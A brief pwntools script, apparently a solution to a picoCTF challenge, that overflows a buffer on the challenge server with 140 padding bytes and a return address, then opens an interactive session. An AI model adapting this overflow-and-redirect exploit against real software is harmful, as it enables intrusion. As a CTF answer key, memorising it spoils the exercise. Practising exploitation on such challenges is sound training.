from pwn import *

HOST, PORT = 'saturn.picoctf.net', 51890
r = remote(HOST, PORT)
# r = process('./vuln.exe')
r.sendlineafter('!\r\n', b'A' * 140 + p64(0x401530))
r.interactive()